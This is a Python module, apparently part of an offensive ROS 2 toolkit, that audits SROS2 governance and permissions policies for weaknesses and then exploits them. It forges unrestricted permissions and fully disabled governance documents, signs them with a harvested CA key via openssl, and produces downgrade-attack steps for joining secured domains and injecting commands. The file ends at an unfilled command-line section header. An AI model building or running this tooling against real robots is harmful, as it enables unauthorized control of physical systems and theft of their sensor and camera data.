#!/usr/bin/env python3
"""
policy_subverter.py - Phase 5B Module 3: SROS2 Governance/Permissions Policy Analysis & Subversion

Parses, analyzes, and exploits SROS2 governance and permissions policy documents.
Identifies misconfigurations that allow unauthorized access, forges policy documents
when CA key material is available (from cert_harvester.py Module 2), and generates
RTPS participants that exploit policy gaps.

SROS2 Policy Architecture:
  governance.xml  — Domain-wide security rules. Signed as governance.p7s (S/MIME CMS)
  permissions.xml — Per-node topic/service/action grants. Signed as permissions.p7s

  Both are signed by the Permissions CA and distributed to all nodes via SROS2 keystore.
  A node validates the signature against permissions_ca.cert.pem before loading the policy.

Governance.xml structure:
  <dds xmlns:xsi="..." xsi:noNamespaceSchemaLocation="...">
    <profiles>
      <profile>
        <domains><id_range><min>0</min><max>230</max></id_range></domains>
        <allow_unauthenticated_participants>false</allow_unauthenticated_participants>
        <enable_join_access_control>true</enable_join_access_control>
        <discovery_protection_kind>ENCRYPT</discovery_protection_kind>
        <liveliness_protection_kind>ENCRYPT</liveliness_protection_kind>
        <rtps_protection_kind>SIGN_WITH_ORIGIN_AUTHENTICATION</rtps_protection_kind>
        <topic_access_rules>
          <topic_rule>
            <topic_expression>*</topic_expression>
            <enable_discovery_protection>true</enable_discovery_protection>
            <enable_liveliness_protection>true</enable_liveliness_protection>
            <enable_read_access_control>true</enable_read_access_control>
            <enable_write_access_control>true</enable_write_access_control>
            <metadata_protection_kind>ENCRYPT</metadata_protection_kind>
            <data_protection_kind>ENCRYPT</data_protection_kind>
          </topic_rule>
        </topic_access_rules>
      </profile>
    </profiles>
  </dds>

Permissions.xml structure:
  <permissions>
    <grant name="node_name">
      <subject_name>CN=node_name,O=domain</subject_name>
      <validity><not_before>..</not_before><not_after>..</not_after></validity>
      <allow_rule>
        <domains><id>0</id></domains>
        <publish><topics><topic>*</topic></topics></publish>
        <subscribe><topics><topic>*</topic></topics></subscribe>
      </allow_rule>
      <default>DENY</default>
    </grant>
  </permissions>

Attack scenarios:
  1. PERMISSIVE domain — allow_unauthenticated_participants=true → unsecured join
  2. Wildcard grant — topic=* → any topic can be published/subscribed
  3. SIGN-not-ENCRYPT discovery — discovery_protection_kind=SIGN → discovery visible
  4. No write access control — enable_write_access_control=false → no injection prevention
  5. Forged permissions — CA key from Module 2 → sign new unrestricted permissions.p7s
  6. Overly broad subject_name — subject_name=* or regex → any cert matches
  7. Expired validity window — old grants with no_after in the past (if accepted)
  8. DENY default missing — missing default tag means implicit ALLOW on some implementations

Author: Gh057x | Phase 5B
"""

import os
import sys
import json
import re
import argparse
import hashlib
import base64
import struct
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from datetime import datetime, timezone
from enum import Enum
from io import StringIO

try:
    import xml.etree.ElementTree as ET
    HAS_XML = True
except ImportError:
    HAS_XML = False


# =============================================================================
# Policy Finding Types
# =============================================================================

class PolicySeverity(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH     = "HIGH"
    MEDIUM   = "MEDIUM"
    LOW      = "LOW"
    INFO     = "INFO"
    PASS     = "PASS"


@dataclass
class PolicyFinding:
    code: str
    severity: PolicySeverity
    title: str
    description: str
    location: str = ""   # xpath-like location in the XML
    evidence: str = ""
    attack_scenario: str = ""
    cvss: float = 0.0

    def to_dict(self) -> Dict:
        return {
            "code": self.code,
            "severity": self.severity.value,
            "title": self.title,
            "description": self.description,
            "location": self.location,
            "evidence": self.evidence,
            "attack_scenario": self.attack_scenario,
            "cvss": self.cvss,
        }


# =============================================================================
# Governance Analyzer
# =============================================================================

class GovernanceAnalyzer:
    """Parses and analyzes SROS2 governance.xml for security misconfigurations."""

    def analyze_xml(self, xml_text: str) -> Tuple[List[PolicyFinding], Dict]:
        """Parse governance XML and return (findings, parsed_config)."""
        findings: List[PolicyFinding] = []
        config: Dict[str, Any] = {}

        if not HAS_XML:
            findings.append(PolicyFinding(
                "GOV-000", PolicySeverity.INFO,
                "XML parser unavailable", "Cannot parse governance XML — xml.etree.ElementTree missing",
            ))
            return findings, config

        try:
            root = ET.fromstring(xml_text)
        except ET.ParseError as e:
            findings.append(PolicyFinding(
                "GOV-000", PolicySeverity.INFO,
                "XML parse error", str(e),
            ))
            return findings, config

        for profile in root.iter("profile"):
            cfg = self._parse_profile(profile)
            config.update(cfg)
            findings.extend(self._check_profile(cfg))

        return findings, config

    def _parse_profile(self, profile) -> Dict[str, Any]:
        cfg: Dict[str, Any] = {}
        for child in profile:
            tag = child.tag
            text = (child.text or "").strip()
            cfg[tag] = text

        # Parse topic_access_rules
        tar = profile.find("topic_access_rules")
        if tar is not None:
            rules = []
            for rule in tar.findall("topic_rule"):
                r: Dict[str, Any] = {}
                for child in rule:
                    r[child.tag] = (child.text or "").strip()
                rules.append(r)
            cfg["topic_rules"] = rules

        return cfg

    def _check_profile(self, cfg: Dict) -> List[PolicyFinding]:
        findings: List[PolicyFinding] = []

        # GOV-001: Unauthenticated participants allowed
        allow_unauth = cfg.get("allow_unauthenticated_participants", "false").lower()
        if allow_unauth == "true":
            findings.append(PolicyFinding(
                "GOV-001", PolicySeverity.CRITICAL,
                "Unauthenticated participants allowed (PERMISSIVE mode)",
                "allow_unauthenticated_participants=true means the domain is in PERMISSIVE mode. "
                "Any participant — including attacker-controlled nodes with no certificates — "
                "can join the DDS domain without authentication.",
                location="profile/allow_unauthenticated_participants",
                evidence="allow_unauthenticated_participants = true",
                attack_scenario="Craft a standard ROS 2 participant (no SROS2 config) → joins domain "
                                "without any credentials → full topic access based on topic_access_rules",
                cvss=9.8,
            ))

        # GOV-002: Join access control disabled
        join_ctrl = cfg.get("enable_join_access_control", "true").lower()
        if join_ctrl == "false":
            findings.append(PolicyFinding(
                "GOV-002", PolicySeverity.HIGH,
                "Join access control disabled",
                "enable_join_access_control=false disables the check that validates a joining "
                "participant's permissions. Authenticated participants are not checked against "
                "the permissions document — any valid cert can join any domain.",
                location="profile/enable_join_access_control",
                evidence="enable_join_access_control = false",
                attack_scenario="Use any certificate signed by the domain CA (even a revoked or "
                                "minimal cert) → joins without permissions check → full access",
                cvss=8.8,
            ))

        # GOV-003: RTPS protection weaker than ENCRYPT
        rtps_prot = cfg.get("rtps_protection_kind", "ENCRYPT")
        if rtps_prot.upper() not in ("ENCRYPT", "ENCRYPT_WITH_ORIGIN_AUTHENTICATION"):
            color = PolicySeverity.HIGH if rtps_prot.upper() in ("SIGN", "SIGN_WITH_ORIGIN_AUTHENTICATION") else PolicySeverity.CRITICAL
            findings.append(PolicyFinding(
                "GOV-003", PolicySeverity.HIGH,
                f"Weak RTPS protection: {rtps_prot}",
                f"rtps_protection_kind={rtps_prot}. RTPS messages are signed but not encrypted. "
                f"DDS topic data is visible to any network observer with packet capture capability. "
                f"Authentication is enforced but confidentiality is not.",
                location="profile/rtps_protection_kind",
                evidence=f"rtps_protection_kind = {rtps_prot}",
                attack_scenario="Passive capture (tcpdump/Wireshark) on DDS multicast port → "
                                "read plaintext topic messages including sensor data, commands, "
                                "navigation goals without any authentication bypass",
                cvss=7.5 if "SIGN" in rtps_prot.upper() else 9.0,
            ))

        # GOV-004: Discovery not protected
        disc_prot = cfg.get("discovery_protection_kind", "ENCRYPT")
        if disc_prot.upper() == "NONE":
            findings.append(PolicyFinding(
                "GOV-004", PolicySeverity.HIGH,
                "Discovery traffic unprotected",
                "discovery_protection_kind=NONE. DDS discovery traffic (participant/endpoint "
                "announcements) is unprotected. Attacker can observe the complete topology "
                "of the secured domain from the network.",
                location="profile/discovery_protection_kind",
                evidence="discovery_protection_kind = NONE",
                attack_scenario="Passive capture on SPDP port → learn all node names, topic lists, "
                                "QoS configs, IP:port mappings for the entire secured fleet",
                cvss=7.0,
            ))

        # GOV-005: Topic rules with disabled access control
        for rule in cfg.get("topic_rules", []):
            topic_expr = rule.get("topic_expression", "*")
            read_ctrl  = rule.get("enable_read_access_control", "true").lower()
            write_ctrl = rule.get("enable_write_access_control", "true").lower()

            if write_ctrl == "false":
                findings.append(PolicyFinding(
                    "GOV-005a", PolicySeverity.CRITICAL,
                    f"Write access control disabled for topic: {topic_expr}",
                    f"enable_write_access_control=false for topic expression '{topic_expr}'. "
                    f"ANY authenticated participant can publish to matching topics without "
                    f"being listed in permissions.xml.",
                    location=f"topic_access_rules/topic_rule[{topic_expr}]/enable_write_access_control",
                    evidence=f"topic={topic_expr}, enable_write_access_control=false",
                    attack_scenario=f"Join domain with any valid cert → publish to {topic_expr} topics "
                                    f"(e.g., /cmd_vel, /move_base_simple/goal) without any permissions grant",
                    cvss=9.8,
                ))

            if read_ctrl == "false":
                findings.append(PolicyFinding(
                    "GOV-005b", PolicySeverity.HIGH,
                    f"Read access control disabled for topic: {topic_expr}",
                    f"enable_read_access_control=false for topic expression '{topic_expr}'. "
                    f"Any authenticated participant can subscribe to matching topics.",
                    location=f"topic_access_rules/topic_rule[{topic_expr}]/enable_read_access_control",
                    evidence=f"topic={topic_expr}, enable_read_access_control=false",
                    attack_scenario=f"Subscribe to {topic_expr} → exfiltrate sensor data, navigation "
                                    f"state, camera feeds without explicit permissions grant",
                    cvss=7.5,
                ))

            # GOV-005c: Metadata unprotected for a topic
            meta_prot = rule.get("metadata_protection_kind", "ENCRYPT")
            if meta_prot.upper() in ("NONE", "SIGN"):
                findings.append(PolicyFinding(
                    "GOV-005c", PolicySeverity.MEDIUM,
                    f"Weak metadata protection for {topic_expr}: {meta_prot}",
                    f"Topic '{topic_expr}' metadata (sequence numbers, timestamps, writer GUID) "
                    f"is {meta_prot} — visible to observers. Enables replay detection bypass.",
                    location=f"topic_access_rules/topic_rule[{topic_expr}]/metadata_protection_kind",
                    evidence=f"topic={topic_expr}, metadata_protection_kind={meta_prot}",
                    attack_scenario="Observe metadata → infer message timing, replay sequence numbers, "
                                    "correlate traffic patterns across nodes",
                    cvss=4.3,
                ))

        if not findings:
            findings.append(PolicyFinding(
                "GOV-PASS", PolicySeverity.PASS,
                "Governance policy appears well-configured",
                "No critical misconfigurations detected in the governance document.",
            ))

        return findings


# =============================================================================
# Permissions Analyzer
# =============================================================================

class PermissionsAnalyzer:
    """Parses and analyzes SROS2 permissions.xml for overly permissive grants."""

    def analyze_xml(self, xml_text: str) -> Tuple[List[PolicyFinding], List[Dict]]:
        """Returns (findings, list of parsed grants)."""
        findings: List[PolicyFinding] = []
        grants: List[Dict] = []

        if not HAS_XML:
            return findings, grants

        try:
            root = ET.fromstring(xml_text)
        except ET.ParseError as e:
            findings.append(PolicyFinding(
                "PERM-000", PolicySeverity.INFO,
                "XML parse error", str(e),
            ))
            return findings, grants

        for grant in root.findall(".//grant"):
            g = self._parse_grant(grant)
            grants.append(g)
            findings.extend(self._check_grant(g))

        # Domain-level checks
        findings.extend(self._check_cross_grant(grants))

        return findings, grants

    def _parse_grant(self, grant) -> Dict[str, Any]:
        g: Dict[str, Any] = {
            "name": grant.get("name", ""),
            "subject_name": "",
            "not_before": None,
            "not_after": None,
            "allow_rules": [],
            "deny_rules": [],
            "default": "DENY",
        }

        sn = grant.find("subject_name")
        if sn is not None:
            g["subject_name"] = (sn.text or "").strip()

        validity = grant.find("validity")
        if validity is not None:
            nb = validity.find("not_before")
            na = validity.find("not_after")
            g["not_before"] = (nb.text or "").strip() if nb is not None else ""
            g["not_after"]  = (na.text or "").strip() if na is not None else ""

        for allow in grant.findall("allow_rule"):
            g["allow_rules"].append(self._parse_rule(allow))

        for deny in grant.findall("deny_rule"):
            g["deny_rules"].append(self._parse_rule(deny))

        default = grant.find("default")
        g["default"] = (default.text or "DENY").strip() if default is not None else "DENY"

        return g

    def _parse_rule(self, rule) -> Dict[str, Any]:
        r: Dict[str, Any] = {"domains": [], "publish_topics": [], "subscribe_topics": [],
                              "request_topics": [], "reply_topics": []}

        domains_el = rule.find("domains")
        if domains_el is not None:
            for id_el in domains_el.findall("id"):
                r["domains"].append((id_el.text or "").strip())
            for rng in domains_el.findall("id_range"):
                mn = rng.findtext("min", "0")
                mx = rng.findtext("max", "230")
                r["domains"].append(f"{mn}-{mx}")

        for section, key in [("publish", "publish_topics"), ("subscribe", "subscribe_topics"),
                              ("request", "request_topics"), ("reply", "reply_topics")]:
            sec = rule.find(section)
            if sec is not None:
                topics = sec.find("topics")
                if topics is not None:
                    for t in topics.findall("topic"):
                        r[key].append((t.text or "").strip())

        return r

    def _check_grant(self, g: Dict) -> List[PolicyFinding]:
        findings: List[PolicyFinding] = []
        name = g["name"]

        # PERM-001: Wildcard subject name
        sn = g["subject_name"]
        if sn in ("*", "") or re.search(r"[*?]", sn):
            findings.append(PolicyFinding(
                "PERM-001", PolicySeverity.CRITICAL,
                f"[{name}] Wildcard subject_name: {sn!r}",
                f"Grant '{name}' uses a wildcard subject_name='{sn}'. ANY certificate "
                f"matching this wildcard (potentially all certs signed by the domain CA) "
                f"will receive these permissions.",
                location=f"grant[{name}]/subject_name",
                evidence=f"subject_name = {sn!r}",
                attack_scenario="Generate any certificate signed by domain CA (or forge with extracted "
                                "CA key) → matches wildcard → inherits all listed permissions",
                cvss=9.8,
            ))

        # PERM-002: Allow default (should be DENY)
        if g["default"].upper() != "DENY":
            findings.append(PolicyFinding(
                "PERM-002", PolicySeverity.HIGH,
                f"[{name}] Default action is not DENY: {g['default']!r}",
                f"Grant '{name}' has default={g['default']!r}. The recommended default is DENY. "
                f"An ALLOW default means any topic not explicitly listed in deny_rules is accessible.",
                location=f"grant[{name}]/default",
                evidence=f"default = {g['default']!r}",
                attack_scenario="Access topics not listed in explicit allow_rules — any unlisted topic "
                                "is implicitly allowed under this grant",
                cvss=8.1,
            ))

        # PERM-003: Wildcard publish topics
        for rule in g["allow_rules"]:
            for topic in rule["publish_topics"]:
                if "*" in topic or topic == "":
                    findings.append(PolicyFinding(
                        "PERM-003a", PolicySeverity.HIGH,
                        f"[{name}] Wildcard publish grant: {topic!r}",
                        f"Grant '{name}' allows publishing to '{topic}' — matches ALL topics. "
                        f"This node (or anything matching its subject_name) can publish to "
                        f"any topic including /cmd_vel, /move_base_simple/goal, etc.",
                        location=f"grant[{name}]/allow_rule/publish/topics/topic",
                        evidence=f"publish topic = {topic!r}",
                        attack_scenario=f"Impersonate node matching subject_name='{g['subject_name']}' "
                                        f"→ publish to any topic without restriction → motion injection, "
                                        f"sensor poisoning, parameter manipulation",
                        cvss=9.0,
                    ))

            for topic in rule["subscribe_topics"]:
                if "*" in topic or topic == "":
                    findings.append(PolicyFinding(
                        "PERM-003b", PolicySeverity.MEDIUM,
                        f"[{name}] Wildcard subscribe grant: {topic!r}",
                        f"Grant '{name}' allows subscribing to '{topic}' — matches ALL topics. "
                        f"This enables full sensor data and state exfiltration.",
                        location=f"grant[{name}]/allow_rule/subscribe/topics/topic",
                        evidence=f"subscribe topic = {topic!r}",
                        attack_scenario=f"Impersonate node → subscribe to all topics → exfiltrate "
                                        f"camera feeds, LIDAR scans, IMU data, navigation plans",
                        cvss=6.5,
                    ))

        # PERM-004: Expired validity window
        not_after_str = g.get("not_after", "")
        if not_after_str:
            try:
                # Handle multiple date formats
                for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S", "%Y-%m-%dT%H:%M:%SZ"):
                    try:
                        not_after = datetime.strptime(not_after_str, fmt).replace(tzinfo=timezone.utc)
                        if not_after < datetime.now(timezone.utc):
                            findings.append(PolicyFinding(
                                "PERM-004", PolicySeverity.MEDIUM,
                                f"[{name}] Permissions grant has expired ({not_after_str})",
                                f"The validity window for grant '{name}' expired on {not_after_str}. "
                                f"Some DDS implementations continue to accept expired grants "
                                f"or may fall back to PERMISSIVE mode.",
                                location=f"grant[{name}]/validity/not_after",
                                evidence=f"not_after = {not_after_str}",
                                cvss=5.0,
                            ))
                        break
                    except ValueError:
                        continue
            except Exception:
                pass

        return findings

    def _check_cross_grant(self, grants: List[Dict]) -> List[PolicyFinding]:
        findings: List[PolicyFinding] = []

        # PERM-005: Duplicate subject names (potential collision)
        subject_names: Dict[str, List[str]] = {}
        for g in grants:
            sn = g["subject_name"]
            if sn not in subject_names:
                subject_names[sn] = []
            subject_names[sn].append(g["name"])

        for sn, gnames in subject_names.items():
            if len(gnames) > 1:
                findings.append(PolicyFinding(
                    "PERM-005", PolicySeverity.MEDIUM,
                    f"Duplicate subject_name across grants: {sn!r}",
                    f"Multiple grants share subject_name='{sn}': {gnames}. "
                    f"A single node matching this DN will receive the union of all matching grants. "
                    f"This may grant unintended privileges.",
                    location="permissions root",
                    evidence=f"subject_name={sn!r} appears in grants: {gnames}",
                    cvss=5.3,
                ))

        return findings


# =============================================================================
# S/MIME / CMS Signature Wrapper Parser
# =============================================================================

def strip_cms_wrapper(p7s_bytes: bytes) -> Optional[bytes]:
    """
    Attempt to extract the inner content from a CMS SignedData structure.
    SROS2 policy files (.p7s) are S/MIME CMS SignedData wrapping XML.
    Returns the raw inner content bytes, or None if parsing fails.

    CMS SignedData wire format (DER/BER):
      SEQUENCE {
        OID signedData (1.2.840.113549.1.7.2)
        CONTEXT[0] {
          SEQUENCE {  -- SignedData
            INTEGER version
            SET digestAlgorithms
            SEQUENCE {  -- EncapsulatedContentInfo
              OID contentType (1.2.840.113549.1.7.1 = data)
              CONTEXT[0] { OCTET STRING content }  ← this is the XML
            }
            ...
          }
        }
      }
    """
    try:
        if b"<?xml" in p7s_bytes:
            # Already unwrapped or embedded PEM
            idx = p7s_bytes.find(b"<?xml")
            return p7s_bytes[idx:]

        # Try base64 decode if PEM-like
        if b"-----BEGIN" in p7s_bytes:
            lines = p7s_bytes.decode("ascii", errors="replace").splitlines()
            b64 = "".join(l for l in lines if not l.startswith("---"))
            p7s_bytes = base64.b64decode(b64)

        # Walk the DER structure looking for the XML content
        # Simple heuristic: find the first OCTET STRING > 100 bytes that starts with <?xml
        offset = 0
        while offset < len(p7s_bytes) - 4:
            tag = p7s_bytes[offset]
            # OCTET STRING = 0x04
            if tag == 0x04:
                length, new_offset = _asn1_read_len(p7s_bytes, offset + 1)
                content = p7s_bytes[new_offset:new_offset + length]
                if length > 100 and content[:5] == b"<?xml":
                    return content
                offset = new_offset + length
            else:
                # Try to skip: read length and advance
                try:
                    length, new_offset = _asn1_read_len(p7s_bytes, offset + 1)
                    offset = new_offset + length
                except Exception:
                    offset += 1

        return None
    except Exception:
        return None


def _asn1_read_len(data: bytes, offset: int) -> Tuple[int, int]:
    b = data[offset]
    offset += 1
    if b & 0x80:
        nb = b & 0x7F
        length = int.from_bytes(data[offset:offset + nb], "big")
        offset += nb
    else:
        length = b
    return length, offset


# =============================================================================
# Policy Forger
# =============================================================================

class PolicyForger:
    """
    Generates forged SROS2 permissions.xml documents.
    If a CA key is available, signs the forged document so it will be accepted
    by DDS-Security access control plugins.

    Without CA key: generates an unsigned XML for analysis or manual signing.
    With CA key:    generates a signed .p7s using subprocess (requires openssl CLI).
    """

    def forge_unrestricted_permissions(self, subject_name: str,
                                        domain_id: int = 0,
                                        node_name: str = "attacker_node",
                                        valid_years: int = 10) -> str:
        """Generate an unrestricted permissions.xml granting publish/subscribe on all topics."""
        now = datetime.now(timezone.utc)
        not_before = now.strftime("%Y-%m-%dT%H:%M:%S")
        not_after = now.replace(year=now.year + valid_years).strftime("%Y-%m-%dT%H:%M:%S")

        return f"""<?xml version="1.0" encoding="UTF-8"?>
<permissions xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xsi:noNamespaceSchemaLocation="http://www.omg.org/spec/DDS-Security/20170901/omg_shared_ca_permissions.xsd">
  <grant name="{node_name}">
    <subject_name>{subject_name}</subject_name>
    <validity>
      <not_before>{not_before}</not_before>
      <not_after>{not_after}</not_after>
    </validity>
    <allow_rule>
      <domains><id>{domain_id}</id></domains>
      <publish>
        <topics><topic>*</topic></topics>
      </publish>
      <subscribe>
        <topics><topic>*</topic></topics>
      </subscribe>
      <relay>
        <topics><topic>*</topic></topics>
      </relay>
    </allow_rule>
    <default>ALLOW</default>
  </grant>
</permissions>
"""

    def forge_governance(self, domain_id: int = 0, permissive: bool = True) -> str:
        """Generate a permissive governance.xml — optionally enabling unauthenticated participants."""
        unauthenticated = "true" if permissive else "false"
        return f"""<?xml version="1.0" encoding="UTF-8"?>
<dds xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:noNamespaceSchemaLocation="http://www.omg.org/spec/DDS-Security/20170901/omg_shared_ca_governance.xsd">
  <profiles>
    <profile>
      <domains><id_range><min>{domain_id}</min><max>{domain_id}</max></id_range></domains>
      <allow_unauthenticated_participants>{unauthenticated}</allow_unauthenticated_participants>
      <enable_join_access_control>false</enable_join_access_control>
      <discovery_protection_kind>NONE</discovery_protection_kind>
      <liveliness_protection_kind>NONE</liveliness_protection_kind>
      <rtps_protection_kind>NONE</rtps_protection_kind>
      <topic_access_rules>
        <topic_rule>
          <topic_expression>*</topic_expression>
          <enable_discovery_protection>false</enable_discovery_protection>
          <enable_liveliness_protection>false</enable_liveliness_protection>
          <enable_read_access_control>false</enable_read_access_control>
          <enable_write_access_control>false</enable_write_access_control>
          <metadata_protection_kind>NONE</metadata_protection_kind>
          <data_protection_kind>NONE</data_protection_kind>
        </topic_rule>
      </topic_access_rules>
    </profile>
  </profiles>
</dds>
"""

    def sign_document(self, xml_content: str, ca_cert_pem: str, ca_key_pem: str,
                       output_path: str) -> bool:
        """
        Sign an XML policy document using openssl to produce a .p7s CMS SignedData.
        Requires openssl CLI in PATH.
        Returns True if signing succeeded.
        """
        import tempfile
        import subprocess

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                xml_path  = os.path.join(tmpdir, "policy.xml")
                cert_path = os.path.join(tmpdir, "ca.cert.pem")
                key_path  = os.path.join(tmpdir, "ca.key.pem")

                with open(xml_path,  "w") as f: f.write(xml_content)
                with open(cert_path, "w") as f: f.write(ca_cert_pem)
                with open(key_path,  "w") as f: f.write(ca_key_pem)

                cmd = [
                    "openssl", "smime", "-sign",
                    "-in",     xml_path,
                    "-signer", cert_path,
                    "-inkey",  key_path,
                    "-out",    output_path,
                    "-outform", "PEM",
                    "-noattr",
                ]
                result = subprocess.run(cmd, capture_output=True, timeout=15)
                if result.returncode == 0:
                    return True
                else:
                    print(f"[-] openssl sign failed: {result.stderr.decode()}")
                    return False
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
            print(f"[-] Signing failed: {e}")
            return False


# =============================================================================
# Downgrade Attack Generator
# =============================================================================

def generate_downgrade_participant_config(domain_id: int = 0) -> Dict:
    """
    Generate configuration for an unsecured DDS participant that can join
    a PERMISSIVE-mode domain. Returns a dict describing the participant setup.
    This exploits allow_unauthenticated_participants=true in governance.xml.
    """
    return {
        "description": "Unsecured ROS 2 participant for PERMISSIVE domain downgrade attack",
        "domain_id": domain_id,
        "security_disabled": True,
        "env_vars": {
            "ROS_SECURITY_ENABLE": "false",
            "ROS_DOMAIN_ID": str(domain_id),
        },
        "attack_steps": [
            "1. Confirm domain is PERMISSIVE (allow_unauthenticated_participants=true via GOV-001)",
            "2. Launch a standard ROS 2 node with ROS_SECURITY_ENABLE=false",
            "3. Node joins the secured domain without any credentials",
            "4. Subscribe to all topics (if enable_read_access_control=false) or",
            "   publish to topics with disabled write_access_control",
            "5. Run Phase 2 injection modules against the now-accessible topic space",
        ],
        "module_chain": "sros2-intercept → confirm PERMISSIVE → Phase 2 inject/impersonate",
        "cvss": 9.8,
    }


# =============================================================================
# Top-Level Analyzer
# =============================================================================

@dataclass
class PolicyAnalysisResult:
    target: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    governance_findings: List[PolicyFinding] = field(default_factory=list)
    permissions_findings: List[PolicyFinding] = field(default_factory=list)
    grants_parsed: int = 0
    governance_config: Dict = field(default_factory=dict)
    forged_permissions: Optional[str] = None
    forged_governance: Optional[str] = None
    downgrade_config: Optional[Dict] = None
    total_critical: int = 0
    total_high: int = 0
    rogue_ca_signing: bool = False

    def to_dict(self) -> Dict:
        all_findings = self.governance_findings + self.permissions_findings
        return {
            "target": self.target,
            "timestamp": self.timestamp,
            "governance_config": self.governance_config,
            "grants_parsed": self.grants_parsed,
            "total_findings": len(all_findings),
            "total_critical": self.total_critical,
            "total_high": self.total_high,
            "rogue_ca_signing": self.rogue_ca_signing,
            "governance_findings": [f.to_dict() for f in self.governance_findings],
            "permissions_findings": [f.to_dict() for f in self.permissions_findings],
            "downgrade_config": self.downgrade_config,
            "forged_governance": self.forged_governance,
            "forged_permissions": self.forged_permissions,
        }


class PolicySubverter:
    """Orchestrates governance/permissions analysis and forgery."""

    def __init__(self, verbose: bool = False):
        self.verbose    = verbose
        self.gov_parser = GovernanceAnalyzer()
        self.perm_parser = PermissionsAnalyzer()
        self.forger     = PolicyForger()

    def analyze_files(self, governance_path: Optional[str] = None,
                       permissions_path: Optional[str] = None,
                       ca_cert_path: Optional[str] = None,
                       ca_key_path: Optional[str] = None,
                       forge: bool = False,
                       subject_name: str = "",
                       domain_id: int = 0) -> PolicyAnalysisResult:

        result = PolicyAnalysisResult(
            target=governance_path or permissions_path or "stdin"
        )

        # Analyze governance
        if governance_path:
            xml = self._load_policy_file(governance_path)
            if xml:
                findings, cfg = self.gov_parser.analyze_xml(xml)
                result.governance_findings = findings
                result.governance_config   = cfg
                # Check for downgrade opportunity
                allow_unauth = cfg.get("allow_unauthenticated_participants", "false").lower()
                if allow_unauth == "true":
                    result.downgrade_config = generate_downgrade_participant_config(domain_id)

        # Analyze permissions
        if permissions_path:
            xml = self._load_policy_file(permissions_path)
            if xml:
                findings, grants = self.perm_parser.analyze_xml(xml)
                result.permissions_findings = findings
                result.grants_parsed = len(grants)

        # Count severities
        all_findings = result.governance_findings + result.permissions_findings
        result.total_critical = sum(1 for f in all_findings if f.severity == PolicySeverity.CRITICAL)
        result.total_high     = sum(1 for f in all_findings if f.severity == PolicySeverity.HIGH)

        # Forgery
        if forge:
            sn = subject_name or "CN=attacker,O=AttackerOrg"
            result.forged_permissions = self.forger.forge_unrestricted_permissions(sn, domain_id)
            result.forged_governance  = self.forger.forge_governance(domain_id, permissive=True)

            if ca_cert_path and ca_key_path:
                try:
                    with open(ca_cert_path) as f: ca_cert = f.read()
                    with open(ca_key_path)  as f: ca_key  = f.read()
                    signed_path = "forged_permissions.p7s"
                    ok = self.forger.sign_document(
                        result.forged_permissions, ca_cert, ca_key, signed_path
                    )
                    result.rogue_ca_signing = ok
                    if ok and self.verbose:
                        print(f"[+] Signed forged permissions → {signed_path}")
                except OSError as e:
                    print(f"[-] Could not read CA material: {e}")

        return result

    def _load_policy_file(self, path: str) -> Optional[str]:
        """Load a policy file, handling .p7s (CMS-wrapped) and plain .xml."""
        try:
            with open(path, "rb") as f:
                raw = f.read()
        except OSError as e:
            print(f"[-] Cannot read {path}: {e}")
            return None

        if path.endswith(".p7s") or (b"-----BEGIN" in raw and b"<?xml" not in raw[:100]):
            xml_bytes = strip_cms_wrapper(raw)
            if xml_bytes:
                if self.verbose:
                    print(f"  [+] Stripped CMS wrapper from {path}")
                return xml_bytes.decode("utf-8", errors="replace")
            else:
                if self.verbose:
                    print(f"  [!] Could not strip CMS wrapper from {path}, trying raw")

        return raw.decode("utf-8", errors="replace")


# =============================================================================
# Output
# =============================================================================

CYAN    = "\033[96m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
RED     = "\033[91m"
DIM     = "\033[90m"
RESET   = "\033[0m"
BOLD    = "\033[1m"

SEV_COLORS = {
    "CRITICAL": RED, "HIGH": YELLOW,
    "MEDIUM": "\033[33m", "LOW": CYAN,
    "INFO": DIM, "PASS": GREEN,
}


def print_policy_report(result: PolicyAnalysisResult):
    print(f"\n{'=' * 65}")
    print(f"  {BOLD}SROS2 POLICY SUBVERSION REPORT{RESET}")
    print(f"{'=' * 65}")
    print(f"  Target:    {result.target}")
    print(f"  Timestamp: {result.timestamp}")
    print(f"{'─' * 65}")

    all_f = result.governance_findings + result.permissions_findings
    print(f"\n  {BOLD}Summary{RESET}")
    print(f"  Findings:  {len(all_f)}  "
          f"({RED}{result.total_critical} CRITICAL{RESET} / "
          f"{YELLOW}{result.total_high} HIGH{RESET})")
    print(f"  Grants analyzed: {result.grants_parsed}")

    if result.rogue_ca_signing:
        print(f"\n  {RED}[!!!] ROGUE CA SIGNING SUCCEEDED — forged_permissions.p7s is valid{RESET}")
        print(f"        → Deploy to target node keystore → join domain with full access")

    if result.downgrade_config:
        dc = result.downgrade_config
        print(f"\n  {RED}[!!!] DOWNGRADE ATTACK POSSIBLE{RESET}")
        print(f"  Domain is in PERMISSIVE mode — unsecured participants are accepted.")
        print(f"  {CYAN}Steps:{RESET}")
        for step in dc.get("attack_steps", []):
            print(f"    {step}")

    def print_section(title: str, findings: List[PolicyFinding]):
        if not findings:
            return
        print(f"\n  {BOLD}{title}{RESET}")
        print(f"{'─' * 65}")
        for f in findings:
            color = SEV_COLORS.get(f.severity.value, "")
            print(f"\n  {color}[{f.severity.value}]{RESET} {f.code}: {f.title}")
            print(f"    {f.description}")
            if f.evidence:
                print(f"    {DIM}Evidence: {f.evidence}{RESET}")
            if f.attack_scenario:
                print(f"    {CYAN}Attack:   {f.attack_scenario}{RESET}")
            if f.cvss:
                color = RED if f.cvss >= 9 else (YELLOW if f.cvss >= 7 else "")
                print(f"    {color}CVSS: {f.cvss}{RESET}")

    print_section("Governance.xml Findings", result.governance_findings)
    print_section("Permissions.xml Findings", result.permissions_findings)

    if result.forged_permissions:
        print(f"\n{'─' * 65}")
        print(f"  {BOLD}Forged Permissions (first 500 chars){RESET}")
        print(f"  {DIM}{result.forged_permissions[:500]}{RESET}")

    print(f"\n{'=' * 65}\n")


def export_json(result: PolicyAnalysisResult, path: str):
    with open(path, "w") as f:
        json.dump(result.to_dict(), f, indent=2)
    print(f"[+] Policy analysis saved to {path}")


# =============================================================================
# Standalone CLI
